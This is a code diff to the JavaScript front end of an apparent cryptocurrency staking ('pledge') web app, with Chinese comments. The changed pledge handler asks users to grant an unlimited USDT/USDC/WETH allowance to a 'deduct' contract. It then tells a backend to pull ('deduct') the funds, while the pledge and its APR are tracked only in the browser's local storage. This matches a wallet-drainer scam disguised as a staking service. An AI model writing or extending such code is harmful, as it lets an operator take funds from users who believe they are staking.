@@ -1462,103 +1462,92 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-      // 【完整整合】質押交易（智能儲存 + 防回溯 + 支援離線）
+        // 【全新設計】質押請求 → 後端扣款（不直接交易）
   if (pledgeBtn) {
     pledgeBtn.addEventListener('click', async () => {
-      if (!signer) { 
-        updateStatus(translations[currentLang].noWallet, true); 
-        return; 
+      if (!signer) {
+        updateStatus(translations[currentLang].noWallet, true);
+        return;
       }
+
       const amount = parseFloat(pledgeAmount.value) || 0;
       const durationDays = parseInt(pledgeDuration.value) || 90;
       const token = pledgeToken.value;
-      if (amount <= 0) { 
-        updateStatus(translations[currentLang].invalidPledgeAmount, true); 
-        return; 
+
+      if (amount <= 0) {
+        updateStatus(translations[currentLang].invalidPledgeAmount, true);
+        return;
       }
 
-      const tokenContract = { 
-        'USDT': usdtContract, 
-        'USDC': usdcContract, 
-        'WETH': wethContract 
-      }[token];
+      // 1. 檢查本地快取餘額
       const decimals = token === 'WETH' ? 18 : 6;
-      const amountStr = amount.toFixed(decimals);
-      const amountWei = ethers.parseUnits(amountStr, decimals);
+      const bigIntBalance = cachedWalletBalances[token] || 0n;
+      const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
+      if (amount > walletBalance) {
+        updateStatus(translations[currentLang].insufficientBalance, true);
+        return;
+      }
 
-      try {
-        // 1. 檢查餘額
-        const balance = await tokenContract.connect(provider).balanceOf(userAddress);
-        if (balance < amountWei) {
-          updateStatus(translations[currentLang].insufficientBalance, true);
-          return;
-        }
-
-        // 2. 設定超大 allowance
-        const currentAllowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
-        const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
-        if (currentAllowance < REQUIRED_ALLOWANCE) {
-          updateStatus(`Approving ${token} (infinite)...`);
+      // 2. 檢查 allowance（後端會再驗證）
+      const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
+      const currentAllowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
+      const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
+      if (currentAllowance < REQUIRED_ALLOWANCE) {
+        updateStatus(`Approving ${token} for backend...`);
+        try {
           const approveTx = await tokenContract.approve.populateTransaction(
-            DEDUCT_CONTRACT_ADDRESS, 
+            DEDUCT_CONTRACT_ADDRESS,
             ethers.MaxUint256
           );
           await sendMobileRobustTransaction(approveTx);
+        } catch (error) {
+          updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
+          return;
+        }
+      }
+
+      // 3. 發送質押請求到後端
+      updateStatus('Sending pledge request to backend...');
+      try {
+        const response = await fetch(`${BACKEND_API_URL}/pledge`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            address: userAddress,
+            amount: amount,
+            token: token,
+            duration: durationDays
+          })
+        });
+
+        if (!response.ok) {
+          const error = await response.text();
+          throw new Error(error);
         }
 
-        // 3. 呼叫 activateService
-        const isActive = await deductContract.isServiceActiveFor(userAddress);
-        if (!isActive) {
-          updateStatus('Activating service...');
-          const tokenAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : 
-                                token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS;
-          const activateTx = await deductContract.activateService.populateTransaction(tokenAddress);
-          await sendMobileRobustTransaction(activateTx);
-        }
+        const result = await response.json();
+        if (!result.success) throw new Error('Backend rejected');
 
-        // 4. 發送請求給後端（優先）
-        updateStatus('Requesting backend deduction...');
-        const alive = await isBackendAlive();
-        if (alive) {
-          const response = await fetch(`${BACKEND_API_URL}/deduct`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              customer: userAddress,
-              token: token === 'USDT' ? USDT_CONTRACT_ADDRESS : 
-                     token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS,
-              amount: amountWei.toString()
-            })
-          });
-
-          if (!response.ok) {
-            const error = await response.text();
-            throw new Error(`Backend error: ${error}`);
-          }
-        }
-
-        // 5. 更新本地狀態（無論後端成敗）
+        // 4. 更新本地 UI（後端已扣款）
         accountBalance[token].pledged += amount;
         const durationInfo = PLEDGE_DURATIONS.find(d => d.days === durationDays);
-        const pledgeOrder = {
+        userPledges.push({
           amount, token, duration: durationDays, startTime: Date.now(), apr: durationInfo.rate
-        };
-        userPledges.push(pledgeOrder);
+        });
 
-        // 6. 智能儲存（支援離線）
         await smartSave({
           pledgedAmount: accountBalance[token].pledged,
           cumulative: (parseFloat(localStorage.getItem('cumulative') || '0') + amount),
           pledges: userPledges,
           lastUpdated: Date.now(),
-          source: alive ? 'client_pledge_backend' : 'client_pledge_offline'
+          source: 'client_pledge_backend'
         });
 
         updateStatus(translations[currentLang].pledgeSuccess);
         updatePledgeSummary();
         updateAccountBalanceDisplay();
         pledgeAmount.value = '';
-        
+
         sendToBackend({ type: 'pledge', amount, token, duration: durationDays });
 
       } catch (error) {
